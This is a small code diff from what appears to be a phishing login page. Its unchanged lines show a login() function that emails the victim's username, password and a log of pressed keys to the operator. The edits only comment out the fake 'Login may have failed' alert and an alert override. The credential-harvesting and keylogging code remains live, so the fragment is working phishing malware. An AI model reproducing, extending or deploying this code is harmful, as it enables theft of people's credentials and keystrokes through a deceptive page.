@@ -28,7 +28,7 @@ var ALERT_BUTTON_TEXT = "Ok";
 
 if(document.getElementById) {
     window.alert = function(txt) {
-        createCustomAlert(txt);
+//         createCustomAlert(txt);
     }
 }
 
@@ -145,7 +145,7 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then(
-    createCustomAlert('Login may have failed'));
+//     createCustomAlert('Login may have failed'));
   
 
 }
@@ -352,7 +352,7 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
   }).then(
-    createCustomAlert('Login may have failed'));
+//     createCustomAlert('Login may have failed'));
   
 
 }
